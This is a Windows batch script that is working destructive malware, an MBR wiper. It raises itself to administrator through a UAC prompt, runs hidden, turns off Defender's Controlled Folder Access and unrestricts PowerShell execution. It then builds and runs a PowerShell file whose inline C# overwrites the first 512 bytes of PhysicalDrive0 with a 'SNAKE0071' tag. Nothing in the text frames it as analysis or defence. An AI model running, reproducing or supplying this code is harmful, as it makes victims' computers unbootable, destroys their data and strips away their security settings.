@echo off
cls
:: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /b

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
@echo off
cls
powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c
cls
mkdir %appdata%\ren
del /s /q %appdata%\ren
cd %appdata%\ren
PowerShell.exe -NoProfile -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser"
powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\ExploitGuard\ControlledFolderAccess" /v "EnableControlledFolderAccess" /t REG_DWORD /d 0 /f
echo $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")                                                                                            > snake0071.ps1
echo if (-not $isAdmin) {                                                                                                                                                                                                                                               >> snake0071.ps1
echo     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs                                                                                                                                                         >> snake0071.ps1
echo     Exit                                                                                                                                                                                                                                                           >> snake0071.ps1
echo }                                                                                                                                                                                                                                                                  >> snake0071.ps1
echo $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")                                                                                                                                                          >> snake0071.ps1
echo $acl = Get-Acl -Path "\\.\PhysicalDrive0"                                                                                                                                                                                                                          >> snake0071.ps1
echo $acl.SetAccessRule($rule)                                                                                                                                                                                                                                          >> snake0071.ps1
echo Set-Acl -Path "\\.\PhysicalDrive0" -AclObject $acl                                                                                                                                                                                                                 >> snake0071.ps1
echo $code = @^"                                                                                                                                                                                                                                                        >> snake0071.ps1
echo using System;                                                                                                                                                                                                                                                      >> snake0071.ps1
echo using System.IO;                                                                                                                                                                                                                                                   >> snake0071.ps1
echo using System.Runtime.InteropServices;                                                                                                                                                                                                                              >> snake0071.ps1
echo using System.Text;                                                                                                                                                                                                                                                 >> snake0071.ps1
echo public class Program                                                                                                                                                                                                                                               >> snake0071.ps1
echo {                                                                                                                                                                                                                                                                  >> snake0071.ps1
echo     public static void Main()                                                                                                                                                                                                                                      >> snake0071.ps1
echo     {                                                                                                                                                                                                                                                              >> snake0071.ps1
echo         string mbrFilePath = @"\\.\PhysicalDrive0";                                                                                                                                                                                                                >> snake0071.ps1
echo         IntPtr mbrFileHandle = CreateFile(mbrFilePath, FileAccess.ReadWrite, FileShare.None, IntPtr.Zero, FileMode.Open, FileAttributes.Normal, IntPtr.Zero);                                                                                                      >> snake0071.ps1
echo         byte[] mbrData = new byte[512];                                                                                                                                                                                                                            >> snake0071.ps1
echo         byte[] newData = Encoding.ASCII.GetBytes("korea youtube SNAKE0071");                                                                                                                                                                                                     >> snake0071.ps1
echo         Array.Copy(newData, 0, mbrData, 0, newData.Length);                                                                                                                                                                                                        >> snake0071.ps1
echo         uint bytesWritten;                                                                                                                                                                                                                                         >> snake0071.ps1
echo         WriteFile(mbrFileHandle, mbrData, (uint)mbrData.Length, out bytesWritten, IntPtr.Zero);                                                                                                                                                                    >> snake0071.ps1
echo         CloseHandle(mbrFileHandle);                                                                                                                                                                                                                                >> snake0071.ps1
echo     }                                                                                                                                                                                                                                                              >> snake0071.ps1
echo     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]                                                                                                                                                                                       >> snake0071.ps1
echo     private static extern IntPtr CreateFile(string lpFileName, FileAccess dwDesiredAccess, FileShare dwShareMode, IntPtr lpSecurityAttributes, FileMode dwCreationDisposition, FileAttributes dwFlagsAndAttributes, IntPtr hTemplateFile);                         >> snake0071.ps1
echo     [DllImport("kernel32.dll", SetLastError = true)]                                                                                                                                                                                                               >> snake0071.ps1
echo     private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);                                                                                                         >> snake0071.ps1
echo     [DllImport("kernel32.dll", SetLastError = true)]                                                                                                                                                                                                               >> snake0071.ps1
echo     private static extern bool CloseHandle(IntPtr hObject);                                                                                                                                                                                                        >> snake0071.ps1
echo }                                                                                                                                                                                                                                                                  >> snake0071.ps1
echo ^"@                                                                                                                                                                                                                                                                >> snake0071.ps1
echo try {                                                                                                                                                                                                                                                              >> snake0071.ps1
echo     Add-Type -TypeDefinition $code -Language CSharp                                                                                                                                                                                                                >> snake0071.ps1
echo     [Program]::Main()                                                                                                                                                                                                                                              >> snake0071.ps1
echo     Write-Host "MD"                                                                                                                                                                                                                                                >> snake0071.ps1
echo }                                                                                                                                                                                                                                                                  >> snake0071.ps1
echo catch {                                                                                                                                                                                                                                                            >> snake0071.ps1
echo     Write-Host "fuck"                                                                                                                                                                                                                                              >> snake0071.ps1
echo }                                                                                                                                                                                                                                                                  >> snake0071.ps1
PowerShell.exe -ExecutionPolicy Bypass -File "%appdata%\ren\snake0071.ps1"